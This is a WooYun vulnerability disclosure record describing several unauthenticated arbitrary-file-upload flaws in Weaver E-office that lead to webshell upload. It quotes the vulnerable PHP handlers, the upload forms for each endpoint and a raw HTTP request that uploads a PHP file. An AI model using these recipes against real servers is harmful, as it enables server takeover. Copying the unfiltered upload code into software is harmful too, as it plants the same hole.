{"id": 65804, "wybug_id": "wooyun-2015-0125592", "wybug_title": "泛微Eoffice 三处任意文件上传可直接getshell", "wybug_corp": "泛微E-office", "wybug_author": "Bear baby", "wybug_date": "2015-07-11 12:10", "wybug_open_date": "2015-10-11 14:18", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "17", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-16：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向公众公开  简要描述： 在实验室奋斗了两天。。来一波 详细说明：  1.文件位置：/webservice/upload.php。相关代码如下：\n<?phpinclude_once( \"inc/utility_all.php\" );$pathInfor = pathinfo( $_FILES['file']['tmp_name'] );$extension = $pathInfor['extension'];$role = UPLOADROLE;$attachmentID = createfiledir( );global $ATTACH_PATH;$path = $ATTACH_PATH.$attachmentID;if ( !file_exists( $path ) ){\t\t\t\tmkdir( $path, 448 );}$attachmentName = $_FILES['file']['tmp_name'];$fileName = $path.\"/\".$_FILES['file']['name'];$fileName = iconv( \"UTF-8\", \"GBK\", $fileName );move_uploaded_file( $_FILES['file']['tmp_name'], $fileName );if ( !file_exists( $fileName ) ){\t\t\t\techo \"false\";}else{\t\t\t\techo $fileName;\t\t\t\techo $attachmentID.\"*\".$_FILES['file']['name'];}?>\n没有做任何限制直接上传，文件名为原文件名，文件路径如下\n$path = $ATTACH_PATH.$attachmentID$fileName = $path.\"/\".$_FILES['file']['name'];\n构造上传表单如下：\n<form action=\"http://网站地址/webservice/upload.php\" form enctype=\"multipart/form-data\"  method=\"POST\"><input name=\"file\" type=\"file\"><input name=\"\" type=\"submit\"></form>\n如下图，返回内容3023528241*i.php对应路径为/attachment/3023528241/i.php\n\n2.文件位置：inc/jquery/uploadify/uploadify.php 相关代码如下\n<?phpfunction createFileDir( ){\t\t\t\tglobal $ATTACH_PATH;\t\t\t\tmt_srand( ( double )microtime( ) * 1000000 );\t\t\t\t$RADOM_ID = mt_rand( ) + mt_rand( );\t\t\t\tif ( !file_exists( $ATTACH_PATH.$RADOM_ID ) )\t\t\t\t{\t\t\t\t\t\t\t\treturn $RADOM_ID;\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\t\t\t\tcreatefiledir( );\t\t\t\t}}if ( !empty( $_FILES ) ){\t\t\t\t$tempFile = $_FILES['Filedata']['tmp_name'];\t\t\t\t$attachmentID = createfiledir( );\t\t\t\t$uploadPath = $_REQUEST['uploadPath'];\t\t\t\tif ( trim( $uploadPath ) == \"\" )\t\t\t\t{\t\t\t\t\t\t\t\t$targetPath = $_SERVER['DOCUMENT_ROOT'].\"/attachment/\".$attachmentID;\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\t\t\t\t$targetPath = $uploadPath.\"/sent/attachment/\".$attachmentID;\t\t\t\t}\t\t\t\tif ( !file_exists( $targetPath ) )\t\t\t\t{\t\t\t\t\t\t\t\tmkdir( $targetPath, 448, true );\t\t\t\t}\t\t\t\t$targetFile = str_replace( \"//\", \"/\", $targetPath ).\"/\".$_FILES['Filedata']['name'];\t\t\t\tmove_uploaded_file( $tempFile, iconv( \"UTF-8\", \"GBK\", $targetFile ) );\t\t\t\techo $attachmentID;}?>\n也是没有任意过滤，文件名为原文件名，可直接上传shell。\n$targetPath = $uploadPath.\"/sent/attachment/\".$attachmentID;$targetFile = str_replace( \"//\", \"/\", $targetPath ).\"/\".$_FILES['Filedata']['name'];\n构造上传表单如下：\n<form action=\"http://网站地址/ inc/jquery/uploadify/uploadify.php\" form enctype=\"multipart/form-data\"  method=\"POST\"><input name=\" Filedata\" type=\"file\"><input name=\"\" type=\"submit\"></form>\n如下图，返回内容1720699075 对应路径为/attachment/ 1720699075/2.php\n\n3.文件位置：/general/weibo/javascript/LazyUploadify/uploadify.php部分相关代码如下：\n<?php….省略部分代码……include_once( \"inc/conn.php\" );if ( !empty( $_FILES ) ){\t\t\t\t$tempFile = $_FILES['Filedata']['tmp_name'];\t\t\t\t$fileName = $_FILES['Filedata']['name'];\t\t\t\t$thumbWidth = $_REQUEST['thumbWidth'];\t\t\t\t$thumbHeight = $_REQUEST['thumbHeight'];\t\t\t\t$attachmentID = createfiledir( );\t\t\t\t$targetPath = ROOT_PATH.\"/attachment/\".$attachmentID.\"/\";\t\t\t\tif ( !file_exists( $targetPath ) )\t\t\t\t{\t\t\t\t\t\t\t\tmkdir( $targetPath, 448, true );\t\t\t\t}\t\t\t\t$targetPath = str_replace( \"//\", \"/\", $targetPath );\t\t\t\t$targetOriginalFile = $targetPath.$fileName;\t\t\t\t$targetOriginalFile = iconv( \"UTF-8\", \"GBK\", $targetOriginalFile );\t\t\t\tmove_uploaded_file( $tempFile, $targetOriginalFile );\t\t\t\t$fileExt = strtolower( substr( $fileName, strrpos( $fileName, \".\" ) ) );\t\t\t\tswitch ( $fileExt )\t\t\t\t{\t\t\t\tcase \".jpg\" :\t\t\t\tcase \".jpeg\" :\t\t\t\tcase \".png\" :\t\t\t\tcase \".gif\" :\t\t\t\t\t\t\t\t$targetThumbPath = ROOT_PATH.\"/attachment/thumb/\".$attachmentID;\t\t\t\t\t\t\t\tif ( !file_exists( $targetThumbPath ) )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\tmkdir( $targetThumbPath, 448, true );\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t$targetThumbFile = $targetThumbPath.\"/\".$fileName;\t\t\t\t\t\t\t\t$targetThumbFile = iconv( \"UTF-8\", \"GBK\", $targetThumbFile );\t\t\t\t\t\t\t\tresizeimage( $targetOriginalFile, $targetThumbFile, $thumbWidth, $thumbHeight );\t\t\t\t\t\t\t\tbreak;\t\t\t\t}\t\t\t\t$targetThumbFile = iconv( \"GB2312\", \"UTF-8\", $targetThumbFile );\t\t\t\t$returnValue['thubmPath'] = str_replace( ROOT_PATH, \"\", $targetThumbFile );\t\t\t\t$returnValue['attachmentID'] = $attachmentID;\t\t\t\t$returnValue['attachmentName'] = $fileName;\t\t\t\t$returnValue['attachmentSize'] = filesize( $targetOriginalFile );\t\t\t\techo json_encode( $returnValue );}?>\n还是无任何过滤，直接getshell。表单如下：\n<form action=\"http://网站地址/general/weibo/javascript/LazyUploadify/uploadify.php\" form enctype=\"multipart/form-data\"  method=\"POST\"><input name=\"Filedata\" type=\"file\"><input name=\"\" type=\"submit\"></form>\n如下图返回为json格式。对应路径/attachment/2012291572/2.php\n\n4.文件位置：/general/weibo/javascript/uploadify/uploadify.php部分代码如下：\ninclude_once( \"inc/conn.php\" );include_once( \"general/weibo/inc/weibo.inc.php\" );include_once( \"general/weibo/inc/thumb_handler.php\" );if ( !empty( $_FILES ) ){\t\t\t\tif ( $_REQUEST['uploadType'] == \"log\" )\t\t\t\t{\t\t\t\t\t\t\t\t$tempFile = $_FILES['Filedata']['tmp_name'];\t\t\t\t\t\t\t\t$fileName = $_FILES['Filedata']['name'];\t\t\t\t\t\t\t\t$targetPath = ROOT_PATH.\"/attachment/\";\t\t\t\t\t\t\t\t$fileExt = substr( $fileName, strrpos( $fileName, \".\" ) );\t\t\t\t\t\t\t\t$logName = \"log\".$fileExt;\t\t\t\t\t\t\t\t$targetFile = str_replace( \"//\", \"/\", $targetPath ).\"/\".$logName;\t\t\t\t\t\t\t\tmove_uploaded_file( $tempFile, iconv( \"UTF-8\", \"GBK\", $targetFile ) );\t\t\t\t\t\t\t\tresize( $targetFile, $targetFile, 295, 195 );\t\t\t\t\t\t\t\t$query = \"SELECT * FROM unit\";\t\t\t\t\t\t\t\t$result = exequery( $connection, $query );\t\t\t\t\t\t\t\tif ( mysql_num_rows( $result ) == 0 )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$query = \"INSERT INTO unit (LOGO) VALUES ('\".$logName.\"')\";\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\telse\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$query = \"UPDATE unit SET LOGO = '\".$logName.\"'\";\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\tif ( exequery( $connection, $query ) )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\techo $logName;\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\telse\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\techo false;\t\t\t\t\t\t\t\t}\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\t\t\t\t$tempFile = $_FILES['Filedata']['tmp_name'];\t\t\t\t\t\t\t\t$fileName = $_FILES['Filedata']['name'];\t\t\t\t\t\t\t\t$userID = $_REQUEST['userID'];\t\t\t\t\t\t\t\t$thumbWidth = $_REQUEST['thumbWidth'];\t\t\t\t\t\t\t\t$thumbHeight = $_REQUEST['thumbHeight'];\t\t\t\t\t\t\t\t$targetPath = ROOT_PATH.\"/attachment/personal/\".$userID;\t\t\t\t\t\t\t\tif ( !file_exists( $targetPath ) )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\tmkdir( $targetPath, 448, true );\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t$fileExt = substr( $fileName, strrpos( $fileName, \".\" ) );\t\t\t\t\t\t\t\t$targetFile = str_replace( \"//\", \"/\", $targetPath ).\"/\".$userID.\"_temp\".$fileExt;\t\t\t\t\t\t\t\tmove_uploaded_file( $tempFile, iconv( \"UTF-8\", \"GBK\", $targetFile ) );\t\t\t\t\t\t\t\t$windowWidth = $_REQUEST['windowWidth'];\t\t\t\t\t\t\t\t$windowHeight = $_REQUEST['windowHeight'];\t\t\t\t\t\t\t\tresize( $targetFile, $targetFile, $windowWidth - 40, $windowHeight - 100 );\t\t\t\t\t\t\t\tlist( $width, $height ) = getimagesize( $targetFile );\t\t\t\t\t\t\t\techo json_encode( array(\t\t\t\t\t\t\t\t\t\t\t\t\"width\" => $width,\t\t\t\t\t\t\t\t\t\t\t\t\"height\" => $height,\t\t\t\t\t\t\t\t\t\t\t\t\"imageSrc\" => \"/\".str_replace( ROOT_PATH, \"\", $targetFile )\t\t\t\t\t\t\t\t) );\t\t\t\t}}?>\n表单可以自行构造。Fiddler请求如下\nPOST http://172.18.30.133/general/weibo/javascript/uploadify/uploadify.php?uploadType=log HTTP/1.1Host: 172.18.30.133User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Cookie: zou__Session=7f895dd642da7e165f485c5a638224e4; PHPSESSID=9ed7d522a1e2caf3f2fe76082450b3a8Connection: keep-aliveContent-Type: multipart/form-data; boundary=---------------------------94401197120954Content-Length: 214-----------------------------94401197120954Content-Disposition: form-data; name=\"Filedata\"; filename=\"2.php\"Content-Type: application/x-php<?php phpinfo();?>-----------------------------94401197120954--\nShell路径即/attachment/log.php\n\n带userID则对应路径/attachment/personal/$userID/$userID_temp.php如下图\n\n   漏洞证明：  \n\n在phith0n的案例中随意挑了个测试\n\n   修复方案：     版权声明：转载请注明来源 Bear baby@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-07-13 14:17 厂商回复： CNVD确认所述情况，已经由CNVD通过以往建立的处置渠道向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-09 12:21 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  哎，这个是小厂商，看样子，文件上传这几个地方被你找到了    \n     2015-07-09 12:22 |    \t\tBear baby \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:20        | 善攻者，不知其所守。善守者，不知其所攻。)\t\t \n  @menmen519 昨天被你发了一波。。你找的那些我应该都有。。亏了    \n     2015-07-09 12:32 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @Bear baby 最新版本的，漏洞比较多，文件上传应该有六处,不过收到2000的感觉不错吧    \n     2015-07-09 12:37 |    \t\tBear baby \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:20        | 善攻者，不知其所守。善守者，不知其所攻。)\t\t \n  @menmen519 木有2000呢    \n     2015-07-09 12:48 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @Bear baby 好吧,打雷那个应该有5000 高产    \n     2015-07-09 13:08 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1427 漏洞数:426        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  @Bear baby 是不是1500啊    \n     2015-07-09 14:11 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  我了个去 这直接都$$了    我再去扒拉扒拉    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}